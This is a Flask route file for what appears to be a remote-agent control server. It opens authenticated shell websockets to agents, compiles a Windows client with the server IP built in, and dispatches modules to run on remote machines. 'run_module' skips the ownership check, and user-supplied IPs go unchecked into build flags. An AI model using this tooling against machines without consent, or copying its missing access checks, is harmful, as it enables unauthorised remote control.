from flask import Blueprint, jsonify, request, send_file
from flask_jwt_extended import get_jwt_identity

from models.agent import Agent
from routes.auth.sudo.system import sock, verify_tokens
from services.agent_ws import _shell_ws_agent
from models.schema import load_modules_from_directory
from models.module import Module
import logging
import socket
logger = logging.getLogger(__name__)

bp = Blueprint("agent", __name__, url_prefix="/agent")


@sock.route(f"/api/v1/auth{bp.url_prefix}/ws/<agent_id>")
def agent_ws(ws, agent_id):
    print("Connecting agent...")

    try:
        msg = ws.receive(timeout=5)
    except Exception:
        logger.info("No handshake received.")
        ws.send("[auth] no handshake received\n")
        ws.close()
        return

    parent_path = request.path.rsplit("/", 1)[0] + "/"
    ok, err, identity = verify_tokens(msg, parent_path)
    if not ok:
        logger.info("Auth failed.")
        ws.send(f"[auth] failed: {err}\n")
        ws.close()
        return

    agent = Agent.by_id(agent_id)
    if not agent or agent.user_id != identity:
        logger.info("Agent not found.")
        ws.send(f"[auth] failed: {err}\n")
        ws.close()
        return

    return _shell_ws_agent(ws, agent, identity)



@bp.route("/reload_modules", methods=["GET"])
def reload_modules():
    load_modules_from_directory()

    return jsonify({
        "result": "success",
    }), 200

@bp.route("/", methods=["GET"])
def list_agents():
    from routes.anon.agent import alive_agents
    user_id = get_jwt_identity()
    agents = Agent.all_by_user(user_id)
    for agent in agents:
        if agent.id not in alive_agents:
            agent.delete()

    return jsonify({
        "result": "success",
        "message": [agent.to_dict() for agent in agents],
    }), 200

@bp.route("/downloadagent", methods=["POST"])
def download_agent():
    user = get_jwt_identity()
    import subprocess
    data = request.get_json()
    ip = data.get("ip")
    output = subprocess.check_output(["bash", "../agent/build.sh", f"-DUSER_NAME=\"{user}\"", f"-DSERVER_IP=\"{ip}\""], cwd="../agent/").decode()
    if "Build successful!" in output:
        return send_file(
            "../agent/client.exe",
            as_attachment=True,
            download_name="client.exe"
        )
    else:
        return jsonify(
            {
                "result":"error",
                "message":"error compiling agent"
            }
        )

@bp.route("/getserverip", methods=["GET"])
def get_server_ip():
    hostname = socket.gethostname()
    server_ip = socket.gethostbyname(hostname)
    return {"result":"successs",
            "message":server_ip}



@bp.route("/runmodule", methods=["POST"])
def run_module():
    from services.agent_ws import dispatch_and_wait
    import time
    data = request.get_json()
    if not all(key in data for key in ["agent_id", "module"]):
        return jsonify({
            "result":"error",
            "message":"missing parameters"
        })
    agent_obj = Agent.by_id(data.get("agent_id"))
    if agent_obj is None:
        return jsonify({
                "result":"error",
                "message":"Agent not found"
            }), 404
    ret = dispatch_and_wait(agent_obj, data.get("module"))
    if ret is not None:
        if ret["retval"] != 0:
            return jsonify({
                "result":"error",
                "message":ret["retval"]
            }), 500
        try:
            if "data" in ret:
                if type(ret["data"]) != str:
                    ret["data"] = ret["data"].decode()
            print(ret)
            return jsonify({
                    "result":"success",
                    "message":ret
                }), 200
        except TypeError:
            return jsonify({
                "result":"error",
                "message":"binary content"
            })
    else:
        return jsonify({
                "result":"error",
                "message":"Error executing command"
            }), 500
            
    

@bp.route("/delete", methods=["POST"])
def delete_agent():
    data = request.get_json() or {}
    agent_id = data.get("id")

    if agent_id is None:
        return jsonify({
            "result": "error",
            "message": "Missing required field: id",
        }), 400

    agent = Agent.by_id(agent_id)
    user_id = get_jwt_identity()

    if not agent or agent.user_id != user_id:
        return jsonify({
            "result": "error",
            "message": "Agent not found",
        }), 404

    agent.delete()

    return jsonify({
        "result": "success",
        "message": f"Agent '{agent_id}' deleted successfully",
    }), 202


@bp.route("/interact", methods=["POST"])
def get_agent():
    data = request.get_json() or {}
    agent_id = data.get("id")

    if agent_id is None:
        return jsonify({
            "result": "error",
            "message": "Missing required field: id",
        }), 400

    user_id = get_jwt_identity()
    agent = Agent.by_id(agent_id)

    if not agent or agent.user_id != user_id:
        return jsonify({
            "result": "error",
            "message": "Agent not found",
        }), 404

    websocket_url = f"/api/v1/auth{bp.url_prefix}/ws/{agent.id}"

    return jsonify({
        "result": "success",
        "message": {
            "agent": agent.to_dict(),
            "websocket_url": websocket_url,
        },
    }), 200